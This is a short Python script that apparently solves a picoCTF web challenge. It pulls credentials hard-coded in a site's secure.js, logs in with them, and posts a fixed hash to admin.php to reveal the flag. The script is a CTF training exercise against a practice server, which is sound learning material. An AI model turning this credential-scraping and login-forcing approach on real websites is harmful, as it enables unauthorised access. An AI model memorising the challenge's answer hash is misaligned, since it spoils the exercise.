from requests import *

URL = "http://saturn.picoctf.net:49760/"

def secure(s):
    page = s.get(URL + "secure.js").text
    user = page.split("'")[1]
    password = page.split("'")[3]
    return s, user, password

def getFlag(s, user, passw):
    data = {"username": user, "password": passw}
    print(s.post(URL + "/login.php", data=data).text)
    data = {"hash": "2196812e91c29df34f5e217cfd639881"}
    print(s.post(URL + "/admin.php", data=data).text)
s = Session()

s, user, password = secure(s)
getFlag(s, user, password)
